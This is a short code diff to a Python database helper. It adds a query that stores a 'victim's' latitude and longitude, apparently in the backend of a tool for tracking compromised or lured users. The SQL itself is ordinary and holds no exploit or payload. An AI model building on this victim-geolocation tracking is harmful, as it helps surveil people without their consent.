@@ -103,6 +103,8 @@ class Database(object):
         	return ("UPDATE victims SET status = ? ", ('offline',))
         elif type == 'disconnect_victim':
         	return ("UPDATE victims SET status = ? WHERE id = ?" , ('offline', data,))
+        elif type == 'location_victim':
+            return ("UPDATE geo SET latitude = ?, longitude = ? WHERE id = ?" , (data[1], data[2], data[0]))
         else:
         	return False
 
